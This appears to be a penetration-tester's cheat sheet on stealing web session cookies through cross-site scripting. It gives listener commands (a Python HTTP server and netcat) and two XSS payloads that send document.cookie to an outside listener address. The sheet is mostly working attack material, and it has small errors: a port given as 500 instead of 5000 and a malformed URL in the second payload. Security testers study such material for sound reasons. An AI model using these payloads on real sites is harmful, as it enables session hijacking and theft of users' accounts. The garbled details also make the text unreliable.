# Steal web session cookies

## XSS Cookie Stealers
As with all XSS, a good first pass is to test for improper sanisation, e.g. `<script> print() </script>. However, note that this may not return a reponse even if vulernable (for example, asynchronous processing of the input).

Step 1. Start a listener
This can be either a http server or using netcat.

- `python -m http.server 5000`: Start a simple listener over http on port 500. Note that the server will expose anything in the root of where it started.
- `nc -lvvp 5000`: Start a netcat based listener on port 5000

Step 2. Deliver an XSS payload
Sample payloads:
- `<script>var i=new Image(); i.src="http://192.0.0.1:5000/?cookie="+btoa(document.cookie); </script>`: Fires when image is sourced
- `<img src=1 onerror="document.location='http://192.0.0.1:500:5000/?c='+document.cookie">`: Fires when image fails to load 
